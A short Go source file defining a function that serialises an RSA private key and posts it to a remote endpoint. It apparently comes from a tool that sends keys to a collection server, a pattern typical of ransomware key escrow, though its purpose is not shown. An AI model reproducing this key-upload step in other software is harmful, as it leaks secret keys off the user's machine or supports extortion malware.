package main

import (
	"crypto/rsa"
	"net/http"
	"net/url"
)

// PostKey sends the private key to the remote serrver
func PostKey(priv *rsa.PrivateKey) error {
	key := Stringify(priv)

	_, err := http.PostForm(Endpoint, url.Values{"k": {key}})

	return err
}
